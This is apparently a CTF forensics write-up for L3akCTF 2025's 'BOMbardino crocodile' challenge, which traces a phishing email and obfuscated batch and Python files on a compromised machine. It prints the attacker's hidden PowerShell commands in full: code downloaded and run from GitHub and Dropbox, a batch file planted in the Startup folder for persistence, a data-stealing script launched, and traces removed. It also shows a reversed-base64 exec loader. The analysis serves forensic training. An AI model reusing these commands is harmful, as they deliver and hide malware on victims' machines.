---
title: L3akCTF 2025 - BOMbardino crocodile. 
categories: [Writeups]
tags: [CTF]
image: /assets/thumbnails/L3ak_CTF_2025_Logo.png
---

## BOMbardino crocodile 

### Challenge Description 

```
APT Lobster has successfully breached a machine in our network, marking their first confirmed intrusion.
Fortunately, the DFIR team acted quickly, isolating the compromised system and collecting several suspicious files for analysis.
Among the evidence, they also recovered an outbound email sent by the attacker just before containment, I wonder who was he communicating with.
The flag consists of 2 parts.
```

### Introduction

Unzip the challenge files, we had been provide with 2 files,  `Welcome to the Brotherhood... 2025-05-10T20_24_11+08_00.eml` email file and `2025-05-30T125329_l3akctf` which is the directory for our target machine artifacts. 

### Analyze The EML File. 

Use the commmand `strings` on the `Welcome to the Brotherhood... 2025-05-10T20_24_11+08_00.eml`. From the result we get a message but has been encrypted using the `base64`.

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/d0957d1f-24b3-48fc-b01d-f0bb27770d1f" />

Decode the encrypted text with the one and only `Cyberchef`. Remove all the HTML and CSS tag from the original text so it more readable.

```
Greetings, Operative.
Your activity has not gone unnoticed. The time has come to proceed to the next level. 
Brotherhood protocols demand absolute discretion. As of 0400 hours, access has been provisioned.
ðŸ“© Secure your invite: ðŸ‘‰ https://discord.gg/a7SUtZXaP4.
Inside you will find leaks of people dumb enough to click on our brainrot exam.
ðŸ”’ Reminder: Do NOT share this link. Operatives who leak will be exiled. Again.
Stay cloaked. Stay corrupt
```

Here we got a link to their `Discord` channel. 

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/0f3dac95-40b3-46b7-b4cf-a21a311698d0" />

There are 2 files contstanlty upload in the channel which is `pay2winflag.jpg.enc` which encrypted and required a key to decrypt it and `Password.zip` which is just an empty file. 

### Analyze The Directory. 

So here, I know that we need to find the `Key` to decode the `pay2winflag.jpg.enc` from the discord channel. But nothing else could be found from the `.eml` and `Discord` channel. Therefore we move on to the next artifacts which is the `2025-05-30T125329_l3akctf` file.

There are 2 users in the machine which is `crustacean` and `public`. Each users got a decent amount of files, so I start with the `crustacean` first, maybe got a leads somewhere.

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/78777920-05af-4c14-b745-46c954512211" />

###  Navigate To User "crustacean" Directory. 

After a few minutes wandering around in the folder, we got something quite interesting. In the `/Users/crustacean/Downloads` folder.

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/ad7b8915-d40d-4c32-be44-4ea302e96ca4" />

From the `/Users/crustacean/Downloads` folder, we obtain 3 files. The files that caught my eyes is the first one. 

```
1. Lil L3ak secret plans for tonight.bat - Mysterious Unicode text, UTF-16, little-endian text, with very long lines (32767) with .bat extension
2. lil-l3ak-exam.pdf - just a brainrot quiz for new members format pdf file.
3. roblox-codes.txt - Txt files with bunch of custom made Roblox Gift Cards code.
```

### Analyze .BAT File 

Using the `strings` command on the `Lil L3ak secret plans for tonight.bat`. We see that the contents inside begin with the word `echo` (Echo command use to writes character strings to standard output) followed with a bunch of gibberish unknown brainrot text. But its not stop there, in forensic, everything matter even a small things.

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/890b620b-b9e3-4345-808c-fa3a5d147133" />

Keep scrolling down the content of the `.bat` file. I found an interesting `command` hidden in the gibberish text. 

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/57dd7bd0-0906-4708-be41-1de0700194cb" />

Let me pull it out for you: 

```
start /min cmd /c "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://github.com/bluecrustacean/oceanman/raw/main/t1-l3ak.bat'
-OutFile '%TEMP%\temp.bat'; Start-Process -FilePath '%TEMP%\temp.bat' -WindowStyle Hidden"
```

So basically, what the command do is: 

`start /min cmd /c` <-- launches a minimized Command Prompt that runs a PowerShell command

`Powershell -WindowStyle Hidden -Command` <-- Launches PowerShell in a hidden window to nsures the PowerShell window is not visible to the user and prepare to execute next command. 

`Invoke-WebRequest -Uri 'https://github.com/bluecrustacean/oceanman/raw/main/t1-l3ak.bat'` <-- Use to download a file from the specified URL.

`-OutFile '%TEMP%\temp.bat'` <-- Saves the downloaded file in the current users `/%temp/` folder and name as `temp.bat`

`Start-Process -FilePath '%TEMP%\temp.bat' -WindowStyle Hidden` <-- start the process of the recent save file in hidden windows. 

### Analyze Temp.bat File. 

From the lead obtained from previous step, lets jump to the current user `crustacean` temp folder which located in `Appdata/Local/Temp` and analyze the `temp.bat` file. Using the same method, use `strings` commands and read the context inside the file. 

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/f978417a-fe97-4636-82e3-3dba6b25654a" />

Same as previous file, the `temp.bat` start with `echo` command followed by gibberish text. Analyze the full text and we find another interesting `command` hidden in the middle of the gibberish text.

<img width="1901" height="258" alt="image" src="https://github.com/user-attachments/assets/537c887f-91f0-4772-9916-483e4987b923" />

Let me pull it out for you once again: 

```
start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
(New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/bluecrustacean/oceanman/raw/main/ud.bat', '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecure.bat');
(New-Object -TypeName System.Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/uuhwziczwa79d6r8erdid/T602.zip?rlkey=fq4lptuz5tvw2qjydfwj9k0ym&st=mtz77hlx&dl=1',
'C:\\Users\\Public\\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document');
Start-Sleep -Seconds 60; C:\\Users\\Public\\Document\\python.exe C:\Users\Public\Document\Lib\leak.py; Remove-Item 'C:/Users/Public/Document.zip' -Force" && exit
```
What the command do? here: 

`start /min powershell.exe -WindowStyle Hidden -Command` <-- Launches PowerShell in a hidden, minimized window to execute the full command chain silently.

`[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;` <-- Ensures PowerShell uses TLS 1.2 for secure HTTPS connections, required by many modern servers.

`(New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/bluecrustacean/oceanman/raw/main/ud.bat', '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecure.bat');` <-- Downloads a batch file from GitHub and saves it into the user's Startup folder to achieve persistenceâ€”so it runs automatically at system startup.

`(New-Object -TypeName System.Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/uuhwziczwa79d6r8erdid/T602.zip?rlkey=fq4lptuz5tvw2qjydfwj9k0ym&st=mtz77hlx&dl=1', 'C:\\Users\\Public\\Document.zip');` <-- Downloads a ZIP file (T602.zip) from Dropbox and saves it to a public folder accessible to all users.

`Add-Type -AssemblyName System.IO.Compression.FileSystem;` <-- Loads the .NET assembly needed to extract ZIP files using PowerShell.

`[System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document');` <-- Extracts the contents of the ZIP file into the C:\Users\Public\Document\ directory.

`Start-Sleep -Seconds 60;` <-- Pauses execution for 60 secondsâ€”likely to let files extract or system settle before running the next step.

`C:\\Users\\Public\\Document\\python.exe C:\Users\Public\Document\Lib\leak.py;` <-- Runs a Python script (leak.py) using a bundled python.exe interpreterâ€”likely to execute malicious actions such as stealing data.

`Remove-Item 'C:/Users/Public/Document.zip'` -Force <-- Deletes the original ZIP archive to clean up traces of the operation.

`&& exit` <-- Closes the command shell after everything is executed.


### Navigate To User "Public" Directory.

In the previous step, mentioned the zip file has been extract in the `Users/Public` folder as `document` without "S". Nagiate to the folder.

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/9e3ff3b2-e76c-4c66-8518-6e525f7a4075" />

Next, we go to the `lib` folder which also mentioned in the previous commands and find the sus python script known as `leak.py`.

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/46c0dc8e-22ae-4a81-b9ad-89d3c850fbe3" />

### Analyze "leak.py" File. 

`strings` the python file. and once again we met the gibberish text. 

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/55a7c671-4cf2-4f3f-b1a2-b1c4f5deb457" />

But this one quiet different cause the hidden commands has been encrypted using certain encryption method. Let discuss: 

```
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=kSKnoFWoxWW5d2bYl3avlVajlDUWZETjdkTwZVMs9mUyoUYiRkThRWbodlWYlUNWFDZ3RFbkBVVXJ1RXtmVPJVMKR1Vsp
1Vj1mUZRFbOFmYGRGMW1GeoJVMadlVYxmbSJjThN2RxMFVF9WeZRlTr1UMSllUtBHWZVlSxV1aW9UTWplcX1WNYRmM0VUWxI0UhFjShVlaKdlTHdGeWxGbHZ1a180VrpFakBjWzZ1a5cUTWJ1VXxmVPd1RSJnVxgWY
iVUMM90VxUlVYJkVWJj............................(other longs how many bytes of encoded text that so foking long)
```

Above command defines a lambda (anonymous function) _ that:

Takes an input string `__`

Reverses it with `__[::-1]`

Decodes it using Base64 `(b64decode)`

`__import__('base64')` is a sneaky way to import the base64 module without using the normal import keyword.






### Obtained Flag First Part 

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/e07b8fe8-92f8-4f91-9337-226037416d16" />


### Obtained Flag Second Part

![flag](https://github.com/user-attachments/assets/1a4a8f75-eaf2-42b2-a913-b73f6fa98ff2)













